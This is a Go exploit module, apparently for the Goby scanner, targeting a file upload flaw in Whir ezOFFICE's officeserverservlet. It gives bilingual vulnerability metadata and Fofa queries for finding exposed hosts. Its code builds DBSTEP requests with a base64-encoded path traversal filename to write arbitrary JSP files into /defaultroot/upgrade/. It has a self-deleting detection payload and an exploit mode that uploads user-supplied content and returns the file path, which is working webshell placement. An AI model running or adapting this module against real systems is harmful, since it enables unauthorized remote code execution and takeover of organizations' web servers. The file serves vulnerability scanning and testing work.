package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Whir ezOFFICE officeserverservlet file upload vulnerability",
    "Description": "<p>Whir ezOFFICE is a FlexOffice independent and secure collaborative office platform for government organizations, enterprises and institutions.</p><p>Whir ezOFFICE collaborative office system officeserverservlet has a file upload vulnerability. Attackers can upload dangerous types of files without restrictions, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Impact": "<p>Whir ezOFFICE collaborative office system officeserverservlet has a file upload vulnerability. Attackers can upload dangerous types of files without restrictions, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has not yet provided a vulnerability patching solution, please pay attention to the manufacturer's homepage for timely updates: <a href=\"http://www.whir.net/\">http://www.whir.net/</a></p>",
    "Product": "Whir-ezOFFICE",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "万户 ezOFFICE officeserverservlet 文件上传漏洞",
            "Product": "万户网络-ezOFFICE",
            "Description": "<p>万户 ezOFFICE 是面向政府组织及企事业单位的 FlexOffice 自主安全协同办公平台。</p><p>万户ezOFFICE协同办公系统 officeserverservlet 存在文件上传漏洞，攻击者可以不受限制地上传具有危险类型的文件，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商尚未提供漏洞修补方案，请关注厂商主页及时更新： <a href=\"http://www.whir.net/\">http://www.whir.net/</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">万户ezOFFICE协同办公系统</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">存在文件上传漏洞，攻击者可以不受限制地上传具有危险类型的文件，写入后门，获取服务器权限，进而控制整个web服务器。</span><br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Whir ezOFFICE officeserverservlet file upload vulnerability",
            "Product": "Whir-ezOFFICE",
            "Description": "<p>Whir ezOFFICE is a FlexOffice independent and secure collaborative office platform for government organizations, enterprises and institutions.</p><p>Whir ezOFFICE collaborative office system officeserverservlet has a file upload vulnerability. Attackers can upload dangerous types of files without restrictions, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The manufacturer has not yet provided a vulnerability patching solution, please pay attention to the manufacturer's homepage for timely updates: <a href=\"http://www.whir.net/\">http://www.whir.net/</a><br></p>",
            "Impact": "<p>Whir&nbsp;ezOFFICE collaborative office system officeserverservlet has a file upload vulnerability. Attackers can upload dangerous types of files without restrictions, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "title=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || banner=\"LocLan\" || header=\"OASESSIONID=\" || banner=\"OASESSIONID=\" || banner=\"/defaultroot/sp/login.jsp\" || header=\"/defaultroot/sp/login.jsp\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_\"",
    "GobyQuery": "title=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || banner=\"LocLan\" || header=\"OASESSIONID=\" || banner=\"OASESSIONID=\" || banner=\"/defaultroot/sp/login.jsp\" || header=\"/defaultroot/sp/login.jsp\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_\"",
    "Author": "su18@javaweb.org",
    "Homepage": "http://www.whir.net/cn/ezofficeqyb/index_52.html",
    "DisclosureDate": "2022-02-08",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "fileName",
            "type": "input",
            "value": "aaa",
            "show": ""
        },
        {
            "name": "fileContent",
            "type": "input",
            "value": "<%=23%>",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10493"
}`

	exploitWanHuUploadFile02193845 := func(fileName string, fileContent string, host *httpclient.FixUrl) bool {
		payloadLen := strconv.Itoa(len(fileContent))
		fileName = base64.StdEncoding.EncodeToString([]byte("../../upgrade/" + fileName + ".jsp"))
		requestConfig := httpclient.NewPostRequestConfig("/defaultroot/officeserverservlet")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Timeout = 30
		body := "DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU\r\nisEncrypt=MA==\r\nmoduleType=aW5mb3JtYXRpb24=\r\nFILENAME=" + fileName + "\r\n"
		bodyLen := strconv.Itoa(len(body))
		data1 := fmt.Sprintf("%-16s", "DBSTEP V3.0")
		data2 := fmt.Sprintf("%-16s", bodyLen)
		data3 := fmt.Sprintf("%-16d", 0)
		data4 := fmt.Sprintf("%-16s", payloadLen)
		requestConfig.Data = data1 + data2 + data3 + data4 + body + fileContent
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "5L+d5a2Y5oiQ5YqfIQ==")
		}
		return false
	}
	checkWanHuUploadFile09485483 := func(fileName string, fileContent string, host *httpclient.FixUrl) bool {
		requestConfig := httpclient.NewGetRequestConfig("/defaultroot/upgrade/" + fileName + ".jsp")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(host, requestConfig); err == nil {
			return resp.StatusCode == 200 && strings.Contains(resp.RawBody, fileContent)
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(6)
			fileContent := "<% out.println(\"" + randStr + "\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>"
			fileName := goutils.RandomHexString(6)
			if exploitWanHuUploadFile02193845(fileName, fileContent, u) {
				return checkWanHuUploadFile09485483(fileName, randStr, u)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			fileName := ss.Params["fileName"].(string)
			fileContent := ss.Params["fileContent"].(string)
			if exploitWanHuUploadFile02193845(fileName, fileContent, expResult.HostInfo) {
				expResult.Success = true
				expResult.Output = "文件上传成功，请访问路径：/defaultroot/upgrade/" + fileName + ".jsp"
			}
			return expResult
		},
	))
}
